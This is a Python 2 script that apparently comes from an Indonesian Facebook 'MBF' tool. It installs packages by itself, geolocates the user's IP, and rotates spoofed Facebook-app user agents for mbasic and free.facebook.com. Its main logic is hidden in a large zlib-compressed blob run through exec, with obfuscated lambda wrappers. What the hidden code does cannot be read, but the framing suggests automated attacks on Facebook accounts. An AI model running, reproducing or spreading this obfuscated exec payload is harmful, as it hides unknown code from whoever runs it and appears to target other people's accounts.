#-*-coding:utf-8-*-

import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool
if ("linux" in sys.platform.lower()):
	##### WARNA #####
        P = '\033[0;97m' # Putih
        M = '\033[0;91m' # Merah
        H = '\033[0;92m' # Hijau
        K = '\033[0;93m' # Kuning
        B = '\033[0;94m' # Biru
        U = '\033[0;95m' # Ungu
        O = '\033[0;96m' # Biru Muda
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
try:
        import bs4
except ImportError:
        os.system("pip2 install bs4")

host="https://mbasic.facebook.com"
##### RANDOM USERAGENT #####
ua = random.choice(['Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe);]',
'Mozilla/5.0 (Linux; Android 10; SM-A105FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 9; SNE-LX1 Build/HUAWEISNE-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 10; Mi A2 Lite Build/QKQ1.191002.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; SM-T505 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 10; SNE-LX1 Build/HUAWEISNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.66 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/304.0.0.42.118;]',
'Mozilla/5.0 (Linux; Android 8.1.0; DUA-L22 Build/HONORDUA-L22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.134 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L31 Build/HUAWEIVNS-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 6.0; MYA-L11 Build/HUAWEIMYA-L11; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/246.0.0.7.121;]',
'Mozilla/5.0 (Linux; Android 7.1.1; SM-J250Y Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; RMX2155 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 8.1.0; ASUS_X00HD Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.83 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/256.0.0.16.119;]',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 10; MI 8 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 7.0; A7Pro Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 9; LG-H870 Build/PKQ1.190522.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 10; RMX1971 Build/QKQ1.190918.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 9; Redmi S2 Build/PKQ1.181203.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 8.0.0; ATU-L11 Build/HUAWEIATU-L11; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]'])
##### LOGO #####
logo = """
  __  __ ____  _____
 |  \/  | __ )|  ___| *au : ./Bang.badru23
 | |\/| |  _ \| |_    *fb : fb.com/Bang.badru23
 | |  | | |_) |  _|   *gh : github.com/AkinXD
 |_|  |_|____/|_|     *yt : MBW DRU
"""
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"}).json()["country_name"].lower()
except:
	ips=None
uas=None
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()
mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
free_h={"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
exec((lambda _____, ______ : ______(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 122, 108, 105, 98, 34, 41, 46, 100, 101, 99, 111, 109, 112, 114, 101, 115, 115],chr))(_____),"<haMzah>","exec"))(b'x\x9cUZi[\x14K\xb3\xfc~\x7f\xc5\x00\x8a\xa0\xa0U=\xbdT!\x9b\x80\x82,\x8a\xa2\x802\x88\xd5\x9b\x800\xc0\x082\xe2\xf2\xdboEF\xf2\x9c{\xdf\xe7\x9daN/\xd5Y\x99\x91\x91\x91\xd9\x8eu^.\xbf\xff\xb4\xfd\xa1\xb3\xf4\xa9\xb3t\xf1\xab\xb3\x16\xce\xef\xc2\xda\xff\x8cuvn\xca\x1f\xd5\xe0\xa4l:\xcb\x17\xdf;\xcb\xc7\xa1\xdf\x9cu>]\xdc|\xb8\x89\x87VoB\xe7E\xff\xf4\xa4\xff-^\xb9\x12\xfa\x9d\xf5\xd0\xff\x16\xffl\xde\\\x86\xce\xab\x8b\xb3\xb3\x8b\xdb\xce\xea\xc9\xf5\xf1M\x89K\xff\xa7\x196\xd5\xc4\xc4Y8/\xeb\xd09\xc2\xff\xa6\xf8\xe7\xa83\xa3?&\x9a\x9f\xe1\xec\xff]3\x85\xff\xeb\xf9\xa7\xa7\x17\'\xfd\x89\x83\xa3\x89\xf8{\xb2\xd3^\x0cp\xb4s\xd2\x8f\x7f\x0e\'\'\'\x1e=\x9a:\xf0\xd9T\x07\x1fk\xe4\xcb\xc7/\x9b\xe0\xcb\xe2+\xc5W\xce+\xf0I\xcdT\xa7\x8b\x83\t\xae1N\xef\xf3\x8e\x87\xd3xS\x9a\xe3\xa0\xc1W\xfc/\xef\xef\xd7\xfa?K\xa7z\xd2\xdaL\xbe\x0e\xa7\xaa\xe3A\xb4Gv495:{\x1c\xb6\xee\xc2\xf1\xfc\xe8\xd4(\\0\x1aO\x95\x8f\x86\xbd\xa1\xaf>\xee\x9f\xef\xf5\x86\xb6\xdb\x1bVu\xfc\x9b\xf4\x86m\x15?\r\xff\xba\x10\x8fe\x1f\xe2\x8f\xa4\xf7\xa87lL\xbc,\x9e*\x9b\xf8e\xf2x.]Y\x89\xdf\xf1\xb0\xb1\xef\xe2\x0f\xfb2^\x80\xb5\xb2\xde\xb0\xf6\xfc\xd8\xb8\xaeI\x96\xe2A\x83K\x1fp\xd56~\xea2.\xd9\xc6\xd5\xeb\xe22\xfej~\xcc\x8d\x7f\x8a\x7f\xe3\xbae\xbc?\x14\xf1o\xb8\xff|\xe3\x01\xdf\xe5\xc9:\xbb\x8d\xab\xe2\x8a\xf2w\\9>\xa6\x8dg\\\xfc4i\xfc\xediB\xd5\xd6\xb4\xc7c?m\xbc:\xee\xcf\x96\xf8\xbd)\xfb\x89\x87B\xfc4\xe5\x93b&\xfe\x84\xc5e\xbc\xa5\x8d\xf76\xc9\x01\xae\x8f\x87K\xc3E\xda|*^P:~j\xf8!.e\x9a-,\x80M\xe4\xd1z\xeb\xf94|\x0c<\xd8\xaaG\xe2-\xb6\xf8\x19O\xb8\xb3xm\xdcSc\xaf\xe2\x9a\x8eN\x92Mb\xc5\x94\xbb\xa9\xe2\x82.~\xca.?\xf8\xed\xc5\xb4\xba\x9e\xa5\x01\xa1\xb1\xf1?\xe3\xf5\xbe\x8d\xcb\xd6\t\x16y\x13\x97\x8dN\xa9*\x1aP\xc7\xdf\xae\x8e\xf69\xec\xdfp\xb3X\xdac\xe3\xddzd\xfe\x9a\xb6\xd8\x16\xdb\x8b7W\xf4S\x95\xc7\x13\xad]\xe0\xd1\xaa\xc5\x1d_\x00\x17l\xea\xf9\x11\x16\x9c\xc1\x0e~\xe5\xb8\x0c;\x1b\x83\xed\xe3p\xaa\xb8\xca\xfcp\xcf\x19`\xef\xf9i\xfc?+\xb6\xd9\xd5\xf8\xec\xe8\xe06\x89FU\xd1l\x8f\xa3A\r\xc4\t\xf3\x91P\x0b\xc0G\xbc\xc0\xb8?\x04\r\xbc\xe3q0=\xc6&\xcd8\x80p\xa5{\xb5gO\xb9^\x88W\x85dI\xe1\x8b-ce_\xd8\xdb\xef\xf0\xdfw\xd82\xfa\xf3\xf1G>\xb5.\xe4\xab7x\x05\xdb\xe2V\x1a/\x8bE|5A\x83a\xfa\xff\xc1\x07\x18\x83\x95\x00\x0b\xd2\xc0\xa6\x1d\x04\xb5\xd7?$n\xe0\xfb\x90.X\x9e\x15g4\xbaL\xc1\xdfb\x9f\xbf\xe9\r\x0bD!\xd1|\xc0Ei\xb1\x01\x0b_\xc7{\x11\xea\x92\x89\t\xff\xf8z\x0e~\xd8\x1a\xdf\xf8\'1yD\xc8\x98\xa67\x88k\xc4\x87\x95p\xa2_\xfaFHE{\xa2\xe7~\xf1\x11\x80\x86\r\x9b\x9f\xb0\xc0t\xfc\xca>\x13\xbd.\x1by\x8axn1\x11\\\xc1\x8fd&\x12\xa0\xd8\x98\xe5\x11\x8b\xcd\xf8\xe8\x9f\xc6e\xfb\xf0\xe6\xe8\xac>\x06\x085\xab@\xfd\xee`o\xfe\x8cXv\xe9\xdbhS\xfd9.^G|x\x04\x0e>5<mJ\x9c\xa5\xd5px\x9b\x9b\xf3K\xa6%.\x85\xc7\x9a|>\x9e\x8f\x8e\xac\xa3\xab\\~\xde\xeb\x11\xc2\xbeyq\xccT\xaa\xba9\xa0\x8d\xdd#\xf7\\1\xf77.\xe14\xdc\x19\xf3N\x9eX\xc3  \x9a\x89\x1c\xbd6\xe0Cl`0k\xb8\xb8Z`\xba\xd6\xf16\x8bKK\xd0R\xb7`\xe6\xc5L{t\xa8q\xea2Kj`\nQ\r\xf1\x80\xe9\x8e\x11z\xb6R\xde\xcci\x81\xb3`\xc6\xc7\xd8\x0c\xc1\x1e\xd3\xaa\xac\x90\x19\xfe\xf3!\x9e\x189&8\xdc3\x9bb\x19\x10\xady\xa8\xfei$\xb1\xc0y\x07\xb3te\x95]\x81j[\xe5\x86x\xa4v\xc4\x086\xe1\xf0\xf0\xf4\xea!\x8f\x98\x86\x0e\x80)\xd8\x15\xae\x067\x02\x85`\xd2\xb6\x10\xf0\r@\xe4\x8b\xe4p\xf9\x80S\xf3\x8f\x84\x00\x10x\x8f\xd8\xa6\xb8\x9a\xe1\xd6\xad{\xc5S\xe0\x05D\x10~\x05k\xb7\xd9G\x9e\x88q\x1c\x8cO\x11e\x06\t\xdc\x1dN\x1c\xd1$\x00\xd2\x81B\xb3\xb17\'8\xbb>?\xa6F:\xfa\xafj\xe7x\x99\xcd\x10w\xe1\xf3\x0c\xb0\x85\xbf\xee\xf4\x9a\x86\xf8pIv\xb2\xf1[\x80\xd8\x87\'WY\x14\x80K\x9b\xcf\x0e\x81\xaa3\xa6\xaa\xebn\xc1\xa5\xbc\x1d\x80\x80\xc7L\xe2\xaf\xb6\xf6\x91\xeejB\xfc\x84\x9c$nAOMq\xf1\x93\xb7\x01\xc1\x0e%\x0f\xd9(4\n\xc2M\x1e\x93\x82-\xd8N\xa2Y\x86\xd3\xe7$\x01c\xf0\xc4@\xe6\x90B\x94\x90\xe3k\xddQ\x8b\x0cFu\xc4NBq\xc4\xa5\x10\x1fc\x98\xb5\xdef\x8fA?\x15\t\xc1X\xe2\x19\xf68\xc1\x92\x90P\xf1\xe3\xf0\x9aA@JE\xd2\xea)\x0f\x96z4\x19Y\x01\x1d|\xd9`x+\x14co\x08\x0f_\xbeaJ\xda\x94\xc9.\x1cX\xf7\xfa\x1fX\xb0\x11>@\xc0\xd8\xf1Y\r\x8b:\xab\xb2\xfd!|\xee\xc8\x87\xb6\xbdb\\|\xf3\x0cL\xd1ee(\xcb\xc5?p\xe6\xcfIn\xbeI\xd2\x8d+-8\xddu\xba\xdeg\xd3p\xae\xa2\xb8\xcb\x12%\x1b\xad\x89]<\xc3\xa5\xcf\x0e\x98\xe2u\xf8E\xfa1\xb6*\x8fWv\x0fxCS\xcc\xfcc\x12\x80x\x9d\xb9f}\xb6\xee\x17\x82\xda\x92"a<v\x0b\x02\x80o|\xb7\xff\xec\x8b:;\x8c/\x10n`\xa9\xc6\x1ec_}\\\xb6\x83\xfd\xec!\r\xc6\x89\x11D\xd0\x88\xbe\xb8\xa6\xd3\xe0j\x84\xda\xb7\xfd?\xf3x\xc2W\x81\xaf\x14,$\xa3h\xaaT\x19(]\xac\xfe\xe2?o\xc0`#\xbc\xb9F\xe8D\xcf\xa4\xd3,\n\xa85\x088\x96\xa9r\xa0#\xb4\xa3\x99J\x06\x97\xdc?\xf3ti\xffj;\xa6Z\x93\x91\tC\xfd\x90\x89\x0cp\x050V\x13.\x98\xb7\x800\xd0os-a\x15\x80X\xfda]\xf7\xd1\xd7%\xb4\x90\xf0"*wp\xa7[X\xa8r\xdf\tI\x0fk!\x17B>\x01G\x9c\xec\xc0\xbd\x89j/)\x19\xe7\xf4~0\x94-@.v\x15\r\x1a\xac\xde6\x0c\x0f\xaa\xaeI\x8cfIAB\xf7\x02\xbf\x8a\xfa\xc5\xfai\xb2\x85l\xc2\xb0\x80\xc3\xcf`\x19c\xaf_\xd1~\xb8\xa7\xec\x8e \x11P\xf0 j\xe4\x02\x03\x85d\x89V\xac\r\xf8\xd8\xfc\n\\\xbdG\xa0U\xcd-\t\x07\x10\x15gv\xc9\n\x80:*\x8d\xa0\x0fu\x00\xf6\xa6A!\xe2\xf2\x19\x91\x8d\xe9\x97\xf1e\x92;\xf6#f8\x10\x106T)\x14\x84\x83\x85\x03\x90Y\xd6\x8cq\xe3\x16\xb9\xd4\xbe\xc2\xdd\x97 \xc8\xb7\xf8\xba\x94\x82\x10w\x90\xbfb\xd6\x85\xf2\x07$\xd0\x9b\x1dn\xc4+;\xf7Q\x87o\'4\x94\x81a\x85$\x86Zj\x9bH<>\xf9\xda\xbb~\xa34\x9b\xb1\xb8\xb8\xfc\x19\xd4\x96\xf2\x1e\x88\xa4V\xd9V\x89\x900\xa4\x13\xa9\x10\xc2p\xf0E\xf1\x9b\x97\x0bz\x9b\xf7\x9f\x14\xbf\t\x97\xad\xc3\xbc\xaa\xdft~[9\xba"\xee\xda\xea\x0c\x80Pu\x84h\xc6\x1b{\xe0\xcd\xf2b\xc0h\xd6"Q\x0f_\xb2\x80\xbaZ\xf3$\xa3\xe3\x9c\xd5j]_]\xd30\x14d\x14<+\xb5\xe6\x1f\xd9\xa3N\x8eOT\xd8\x83\xf5\x8a\x82q\x16M\x05\x81P\xcf/QT Y\xeb\xa4\xf3\x0f\x1b\\`\xf7`\x92t\xf1\x8e\xb6\xc0sM=\xcd\x9ah\xec[l\x00\xbdJu\xf3\x9c\x0e0\xf9?\x12k[\x1ct\x9f\x17\x1b\xaf\x88J\x04\xbe\xb6\x92/0\x15>\xbd\xea]\x1f\xa4\xba\x90\xc9\xcfPZ\xa1\x01\x1a\x8f\x02\x95&\xcc7\\\xea\xcc\xb7\td\xce\x0b\xf24\x18\x1f\xcbIY\x84\xb1\xf5\xea\x04\x9e\r\x9a\xcc\xff<\xa1\x0fP\xd2\x84\xa5R\xd2\x83\x90\xbb%\xb8\x1a\x11;\xddi*V\xeb\xaf?5\x14+^D\xe5\x10_{\x87\xfd\x9d\x15m~T\x87\xb6\xaa\xbfk\x90S\x98\xd6\xf5\xb5\xb3+\xb3E\x80\x86p\x04\xdd{\x84\xa5\x0b\xefb\x830\xa9\xee\xbe!hB\xf7\x84\xc5\x04\xd6\x97\xe9\x826bf\x04|\xf3\x19\xfe\x9d{\x00A1M9/\xa6\xd7;$#\xc4\n\xcf\x0c\x8d\xf1,\x93e\xb9\xf3W\x95\x99\'i#\xb9\r\xb8\x01\x01Cm\xae\xdc(\xac\xfcF\xc9\xe4\xed\x08M\x15v\xbd\x17\x7f\xbcICg\x98\xed\xa1\xed\xcf/\xe2\xf4\xeb\xc5m\xadxN\xe5\x01\xbeL\x01\xba\xcf\xcfg\t9\x94>\xb0\x9d\xa8zu\x8b\x11\xc8\xa0\xe5\x0cB\xfdk\xeb\xda\xdb9\xf3kv4\xa8:C`$\'\xba\xe3\xaf>#\xd2{\x15R\x00\xa4\x82\xee\x02\x97T\xf5\x877DRe6\x16%\xb3\xed\xe7\r\xcdM\xd8o]\xc3J\x8fp\xf9t\xf9\x01\xca\rb\xe2nT\xfb\x83\x0f\x13\xb0}\xfa\x93\xa9WU\xe8\xd4\xdb\xafx\xcaSDb\x87\xa1\x03)JmHF\xbah\x0c\xc2_\xd4Fl\xcd\xbb\x11\x85sF\xf3P\xd5Pcq\x8b\x0b\xab\xf4)D\x03\x9cE\xd5\x1cT0\xf8\x84\xb9U\xd5s\xed\xbfK&e)\xd2\xf9+\x13\xb9J\xbf|\xa6\xb8\xb1f\x85\x82R\x9a\xe6\x84nom\x7f\x13\xa5\xe7\x01\xc2\xbe\x0b\x18\xbe\x80\xafKU\xe6\x96\xe4\x0bD\xfb{\xc3`\x8b\xbd\xa6N\x00\xd7\xba\xf2\x84I\x8a5%\x8c\xcd\x14\x00\xa1=\xab\x10\x94\x10x*\xd0\xba\xe6\x80\xc3\xa4\x9a\x04\xc1\xbf>\x01\x97\xbe\xc6\xde\xd7Q\x80\xbbO\t\xa9\xe0:\xf0\xd0\xcd\x04\xb7\t\xea\xa3.9|L\xbe\xc7\xb2\xe1\xde\xac\x06\x92O\xaa\x88\x04v9}\xfcz\xf4\t\xba-\xe65\x0c\xf3\xf5\x8d\x96\x058\xa6\xf9J\x93}>\x8a&9]Y\x84s\xbb3\x841\xdc\x1d\x9aS8c\xfb=\x00_j\x11Te\x8b.)$ \x15\xb4j\xd2U&\x05\x89\x08*\x00@\xbf\x0f\'L\x04\xf8\xb1\x01iX\xac\xea7\xad\xfeevQ\xed\xc3\xe8\xca\xadi!3\xbd\xde)\xb0\xbf\xc5+\x1a\xfb\rg\xa4O\xaf\x9f\x1d\xc1+\x0f\x81\xaf\x15,vO\xfd\x8e:\xce\xdeSN\x0e\xb4\xb3\x17\x92n\xee`\x89\x90i\xcc\xf5\xe2\t\x95A0\xc8\xde\xe6\x8d\xce\x9d\x1aF\xdb\x14_t\xf8\xa3\x03$\xd03\x98\xa7\xa9vf\x9f\xd3\xdd2\x08(.@\xf5\xd3*\x15\xc3_|\xbd\x03\xb5l) \x82\xdc\xff\xe89\xc1"\x05\xafE\xe8\xd7\x19%\xe7>\x9dc\x99\x92\xcf79\xaaV\x14\xc6\x9b\x0fz\x83y\xacZ`\xc5}\x04\xef\x98\x1e\xaf\x93|\xe7\x82\xa3\x0c\xd7\xfe\x81c^\xd7\x90\xae\xe4\x06g\x17\xdf\x11\xa8R\xbeS-i\x05\xe7P\xb6\xbc$s{?\x07\xa8d\x9d3\xe9W033\xe9G\xe6Ne\xe7\x86w\xd4R\xa5\x9d\xe7C\x11`)\xcd\x95\xeeAxD4\x93\xa8\xa1R\xcb&X\xac(\x80\xa2zM\xd5R\xa2\xba\xca\xa5\xc0Xz@\xbf\xe0\xb0S\x11\x8f=\x96"\x91&_cC\xd8Z\x95\xcelb\xbdw\x08+fb\x98\x0cH\x13\xd1\xaeR\x11U\xd0\xc4"\x19\x10\x0b\xdc\xd2,\xe8\x8c\xaaz\x8f\xd3G+t\x89\x05\xdf[\xfb\x02Q\x812\xf1\x0fu\x82#\xc4\x93\x1d3\xb5\xc0+%\xe6ub\xb0\x8e\x07@+8\x11Z\xaa\xba\xb6Z\x1b&\x1c\'\x81\x98\xa3&\xe9c\x89\x93]z.\xa8\x8d.\x16]\n\x05\xac\xe1\xa6\xe8\x1c\xe4\x84i\xa0\x11\xc3\xd4\xc9\xca\xbd\x1e8}\n^*\xd7\xf7\xffk}\xc57\x05\x13\x08\x0c^\xfb\x8d\xed\x939R\xa8(\xf1\\\xeb^\xc5d\xc3\xb1*\x9c\xed0\xb1\x83]g\xedG\x81\n\x05\xd3\x1ej\xc4\x17?@\x8c\x93\x0b\x92!\xdb\x08\xf4\x1a3Sz\xb0\xfa\xadV\x9b\x9cq\x84j*\x8b\t\x00a\xfe\x80\xc2\x14ESFh\x89L)Vya]G\x05\xf5\x889\x81"W\x97\x9f\x1f\x00\xf87\x18\xa9\x9c\xd2\xcdU\xa6\x15\x1cP\x08fd\xef\xe6\xfd\x89\xd2eU\xef\x93\xc6\xbcX\x8f`\x9a\':\xb9H\xb4\x8dF\x06{0!\n\x0b\xf3\xb4y\xab\x03\xa7\xa0\x92\xcd\xb8M\xe24\xb2\xc0@[\t\xcbJ\xee\x812\x88\x95&\x1b\x11\x99v\xadc\xb4Z\'A\xf6\xdbO^]\x17GO\xc9N2j\x08\xbd\xeb\x1fsw\xcc.\x94\n\xcc_\xd2\x8b\x1d\xf1\xd8\xa0\xd7\xdf\xab\xa1\xb5\xd3\x9b\xbf\xec\xc6k\xb3\x01\xce\xf9\xf7Y&;\xe2\xd3\x8fJ\x83\xeet[G\xa39\x19\\\xb8%\xa9\xdd\x87\x9c\xd8w\xd9w\x9c\x98|\xab\xfa\xab\xc9t\xdcy_P\xba#\xda\xf2\x01\xbc\xa0\x12\x84W0\x06j-V\xd9O\xb4\xf5)S\x12\xc2Uz,\xff\x0e\xfbYZR\x85\x031\xd2\x85\xa3\xf2\xbb#\x06\xbe\x14\xd5\xb5\xaf\x95.\xe3#}\xd8u\xbb\xe4\r\x04\xa0\x05\x0f\xd4\xc9\x17j\x11\xdb\x85\xb2\xaa\xd0H\x97\xa3\xbc\xa7\xb4\xfdm\xfa\xac\xb5\xd0\xb0\xed\xbd\xa2*;Z\xb2\xdd2\x9a\x93\xc3Im\xf2\xcb\x07t\xbd\x97\x0c[f\xbc*\xad\xf1\xbe\xb0\x87#\xaa\x94d\x12\xf7\x12\xceE\xb3\x8d\xb9>\x9e"DX\x93\x96\xcblm\x9d\xffU&\x0bw3\xda\x08\x87\x9d\x87S$Bkt@\x18^\x008`a\x94\x7f\x99oT\x946B\xdeZ\xa8\x91q\xa2Je\x1c\xf7\x8d\x95\x1fK\xc2Y\x8dS\xdew*W\\\xaf\xf7\x98mW\xfc=q\xfc\x8a\xccR\x19\xba\xa5\xed\x16:\x97\xb1\x9bX\xe4\x96u\xca\x87\x0e\x88\xa3\x96\x16\xd6R\xe4\xc88\xb9x\x07*\x9bB\xbe`f\x93\x1d\xe9,1y\x8f\xe5\xf7x7\xc0\x8eJ\x8731Y\x07:&*w\xdf\xc9\x94/\xd9\xfe/\xeda\xae<\xc0+\xdbb\xcf\xc0\x89\xbc\x7f\xb0\x7f\x18]\xc0\xca\xa02\xd4fm\x0f\x99\xecU\xb6\xfa\xee\xa5N\x8c\xbb\xbd\xde\x13n\xc9\xca\x04\xf5\xe6\x8e\x0b\xe2!\xe8&C\xf9\xf0\x15\x1bV\x9f\xd03\xad\x9d"\x9fTv\xa2s\xc3\x04\x01\\C9\xa4\xf0\xb4\xf9\x1c\x95\x9c\x97U\xf1:\x06\xea\xc1\xdbg\x81\xca\t6\x96\xf6\x1f\xbaL7\x0e\xa4\xbc\xc0~\xc7n\xc5\xa4\xc1gv\x90\xd2\xf544\xad\xa9\'G\xc7\x19\xc4\xf8\xb4\x01C\x19\xea;\r\x99d\xdd/\x9e\x17q\xaec)H\x8a\xb6\xdd\x86.*w\xe1\xaf%\xaaT\x9b\xfe\xbe\x7f\xd3\x90\xd0\x95\x002\xd0\x0b\xc2\x85\x17\xa5\xdd\xc1\x1eeB.:\xf0H/\x97W\x06\x86.\x91\n\x82\x9c\xf6\x87P\x9f\x1fU\x0e\xe1\xb1f\x06\x823K\xb6k\xb2\x91\x0c\\tF-\x99\xe0N\xef\x94\x14[\x0c\xcb\xda\x7f\x0c\x19H\xda\t\x80=#\x04jn\xea\xdf(\xe3`\xc8S\xad\xfd\xfe\x17Ro\r\xde\x9b\xe1]\xa2\xbf\xb3\xffj\xb7\xcc\xfc\xba\xef5\xe8\x85\nV\x90W3\x86\xf6\x02\x13\xf0H\xda\xd7 \x85vG\xa3.\xaf\x1f0eO\xef\xd43xa\x80G{\xad\xab`%_i\xad\xf2\x14\xdcAZ\xce\x19\x10\xc8\xd6\xa1\x1a\x88\xd9\x01\x04mr\xfe\x86\x0c,\xaf\xc1\x12\xca\x15\xe3\xae\xb58\x95\x98\xad\xf9\x1f\xac\xfc\xa24\xcaClx^\x83\x91\xa8\xcclg\'\xe0\x94c\x86\xdcB\xc9\x82\xfb\xad\xd6bW\xfc\x19\xbd\x19\xd2\xd5\x1eI\x8a!\xe5/\xf2\x00\x92G\x18\'\xb9^\xe3\x15\xd0\xcd\x00\n\\\x04\xc4\x92}\x92\x9c-\x84k\x8fud&\xfb\xac(;E\xcb8\x1d"g\x92\x9c\r7\xd3@\x17\xc2\xe3u\xf1\x10\xef\xc9\xd0\xc1\x89\t\xd9)\xbd\n<\x9a\xa4\xc3\xe0W\xeaC\xe9\xcb\xab\x97PGxA)\x8d0\xb2\xdc\xdcu\x14\x17~\x9e\xaa\\^\xa5\xe9\xa8\xaf\xa9^r\xe4\xd1\xb8!\xf7 